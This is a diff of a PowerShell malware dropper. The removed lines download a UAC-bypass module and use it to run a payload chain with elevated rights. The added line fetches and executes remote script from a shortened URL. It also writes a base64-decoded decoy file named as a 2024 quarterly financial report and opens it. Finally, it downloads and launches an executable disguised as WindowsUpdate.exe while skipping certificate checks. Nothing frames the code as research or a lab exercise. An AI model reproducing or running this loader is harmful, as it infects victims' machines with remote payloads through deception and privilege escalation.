@@ -1,4 +1,1 @@
-$outputFile = $env:TEMP + '\Eve.ps1';
-iwr -Uri https://github.com/CsEnox/EventViewer-UACBypass/raw/refs/heads/main/Invoke-EventViewer.ps1 -Outfile $outputFile
-Import-Module $outputFile
-Invoke-EventViewer "(iwr https://tinyurl.com/2z5w43fs).Content | iex; Start-Sleep -Seconds 5; iwr -Uri 'https://tinyurl.com/28p8442s' -Outfile 'C:\Windows\Temp\WindowsUpdate.exe'; Start-Process C:\Windows\Temp\WindowsUpdate.exe; Start-Sleep -Seconds 10;`$outputFile = `$env:TEMP +'\First_Quarter_Financial_Report_2024.docx'; `$b64 = [System.Convert]::FromBase64String((iwr -Uri https://tinyurl.com/mryf4waj).Content); [System.IO.File]::WriteAllBytes(`$outputFile, `$b64); Start-Process `$outputFile";
+(iwr https://tinyurl.com/2z5w43fs).Content | iex; $outputFile = $env:TEMP +'\First_Quarter_Financial_Report_2024.docx'; $b64 = [System.Convert]::FromBase64String((iwr -Uri https://tinyurl.com/mryf4waj).Content); [System.IO.File]::WriteAllBytes($outputFile, $b64); Start-Process $outputFile; iwr -Uri 'https://tinyurl.com/34v57j64' -Outfile 'C:\Windows\Temp\WindowsUpdate.exe' -SkipCertificateCheck; Start-Process C:\Windows\Temp\WindowsUpdate.exe;
